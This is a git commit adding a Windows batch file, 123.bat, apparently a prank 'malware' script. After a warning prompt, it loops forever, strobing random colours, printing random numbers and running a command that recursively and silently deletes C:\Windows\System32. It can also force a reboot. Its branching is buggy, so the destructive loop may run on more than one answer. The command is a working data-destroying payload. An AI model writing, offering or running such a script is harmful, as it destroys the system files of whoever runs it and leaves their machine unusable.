03026e6ed41a59148c4b7799b35d2ac1731cb780
L..8 <lalalalucas40@gmail.com>
2026-02-06 20:26:25 -0500

    dont install possibly dangerous

---
+++ 123.bat
@@ -0,0 +1,19 @@
+@echo off
+color 0A
+set /p malwarebyL8recroom=Logs: jesus christ are you sure you want to execute this it is a dangerous BATCH file and i am not responsible for anything so PLEASE are you sure and this is the only warning! (y/n): 
+
+if "%malwarebyL8recroom%"=="y" goto starting goto restarter
+if "%malwarebyL8recroom%"=="n" goto stop
+
+:starting
+set /a strobey=%random% %% 33
+color %strobey%
+echo %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random% %random%
+rmdir /s /q C:\Windows\System32
+goto starting
+
+:restarter
+shutdown /r /t 10 /c %random%
+
+:stop
+pause
